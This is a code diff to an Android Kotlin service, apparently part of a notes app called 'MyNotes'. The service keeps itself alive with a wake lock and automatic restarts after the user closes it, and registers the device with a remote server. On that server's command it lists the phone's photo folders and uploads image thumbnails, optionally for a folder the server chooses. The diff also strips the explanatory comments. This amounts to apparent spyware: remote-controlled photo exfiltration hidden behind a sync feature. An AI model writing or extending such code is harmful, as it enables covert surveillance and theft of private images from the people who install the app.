@@ -40,31 +40,24 @@ class CloudSyncService : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        // 1. PRIORIDAD ABSOLUTA A LA NOTIFICACIÓN
-        // Esto evita el crash en Android 14+
         try {
             startForeground(1, createNotification())
         } catch (e: Exception) {
             e.printStackTrace()
         }
 
-        // 2. Después iniciamos Wakelock (para CPU)
         try {
             val powerManager = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
-            wakeLock?.acquire(60 * 60 * 1000L) // 1 Hora máximo
+            wakeLock?.acquire(60 * 60 * 1000L)
         } catch (e: Exception) {
             Log.e("CloudSyncService", "Error WL: ${e.message}")
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Refuerzo: Asegurar que la notificación esté visible
         startForeground(1, createNotification())
-
         connectAndListen()
-
-        // START_STICKY: Si Android mata el servicio, intenta revivirlo
         return START_STICKY
     }
 
@@ -72,7 +65,6 @@ class CloudSyncService : Service() {
         super.onTaskRemoved(rootIntent)
         Log.d("CloudSyncService", "Detectado cierre forzado (Swipe)")
 
-        // LÓGICA DE RESURRECCIÓN PARA VIVO/XIAOMI
         val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
             setPackage(packageName)
         }
@@ -115,24 +107,29 @@ class CloudSyncService : Service() {
                 Log.d("MyNotesSync", "✅ Conectado al Servidor")
                 registrarDispositivo()
 
-                // --- NUEVO: ENVIAR LISTA DE CARPETAS ---
-                // Esto permite que el servidor V8 muestre el menú desplegable
-                thread { sendFolderList() }
+                // Intentamos enviar carpetas al conectar (por si acaso ya tiene permisos)
+                thread {
+                    try { Thread.sleep(1000) } catch (e: Exception) {}
+                    sendFolderList()
+                }
 
-                // Si se conecta y no estaba haciendo nada, iniciamos escaneo general (sin filtro)
-                // OJO: Si prefieres esperar orden, comenta estas 3 líneas:
                 if (!isScanning) {
                     isScanning = true
                     thread { sendThumbnails(null) }
                 }
             }
 
+            // --- AQUÍ ESTÁ EL CAMBIO IMPORTANTE ---
             socket?.on("command_start_scan") { args ->
                 if (!isScanning) {
                     isScanning = true
-                    var folderFilter: String? = null
 
-                    // Leer si el servidor pidió una carpeta específica
+                    // 1. PRIMERO: Enviamos la lista de carpetas actualizada.
+                    // Esto arregla el problema de los permisos tardíos.
+                    thread { sendFolderList() }
+
+                    // 2. LUEGO: Procesamos el escaneo de fotos
+                    var folderFilter: String? = null
                     if (args.isNotEmpty()) {
                         val params = args[0] as? JSONObject
                         val requestedFolder = params?.optString("folder")
@@ -166,11 +163,12 @@ class CloudSyncService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    // --- NUEVO: ESCANEAR Y ENVIAR LISTA DE CARPETAS ---
     private fun sendFolderList() {
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
         val uniqueFolders = HashSet<String>()
+
+        Log.d("MyNotesSync", "🔍 Actualizando lista de carpetas...")
 
         try {
             contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
@@ -183,20 +181,21 @@ class CloudSyncService : Service() {
                 }
             }
 
+            Log.d("MyNotesSync", "📂 Carpetas encontradas: ${uniqueFolders.size}")
+
             if (uniqueFolders.isNotEmpty()) {
                 val data = JSONObject().apply {
                     put("dataType", "folder_list")
                     put("folders", org.json.JSONArray(uniqueFolders))
                 }
                 socket?.emit("usrData", data)
-                Log.d("MyNotesSync", "Carpetas enviadas: ${uniqueFolders.size}")
+                Log.d("MyNotesSync", "📤 Lista de carpetas enviada (Refresh).")
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e("MyNotesFolders", "Error carpetas: ${e.message}")
         }
     }
 
-    // --- LÓGICA DE ESCANEO CON FILTRO SQL ---
     private fun sendThumbnails(targetFolder: String?) {
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
@@ -205,7 +204,6 @@ class CloudSyncService : Service() {
         var selection: String? = null
         var selectionArgs: Array<String>? = null
 
-        // Si hay carpeta objetivo, filtramos por nombre de bucket
         if (targetFolder != null) {
             selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
             selectionArgs = arrayOf("%$targetFolder%")
@@ -277,8 +275,6 @@ class CloudSyncService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}
-
-        // Intentar revivir inmediatamente
         sendBroadcast(Intent(this, RestartReceiver::class.java))
     }
 }
